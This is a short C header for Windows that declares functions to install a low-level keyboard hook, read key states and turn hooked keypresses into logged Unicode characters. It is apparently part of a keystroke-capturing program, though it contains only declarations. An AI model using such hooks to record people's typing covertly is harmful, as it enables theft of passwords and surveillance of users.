#pragma once

#include "win32.h"

/*
 * set_keyboard_hook - Sets the low level keyboard hook.
 *
 * Returns a non-zero value if the function succeeds. If not, returns zero.
 */
BOOL set_keyboard_hook(VOID);

/*
 * get_keyboard_state - Copies the status of the 256 virtual keys to the
 * provided buffer.
 * @buff: The buffer to be filled with the keyboard state.
 * @size: The size of the buffer.
 */
void get_keyboard_state(BYTE *const buff, const SIZE_T size);

/*
 * is_key_down - Returns whether the provided key is down.
 * @vk_code: The virtual-key code to verify.
 *
 * Returns whether the provided virtual-key code is down.
 */
BOOL is_key_down(const DWORD vk_code);

/*
 * kbd_to_unicode - Logs the respective characters of the provided KBD hook.
 * @kbd_hook: The kbd hook structure of the keypress.
 * @buff: The buffer to be filled with the respective unicode characters.
 * @size: The size of the buffer.
 *
 * Returns the number of characters written to the buffer.
 */
int kbd_to_unicode(const KBDLLHOOKSTRUCT *const kbd_hook, const LPWSTR buff, 
		   const size_t size);
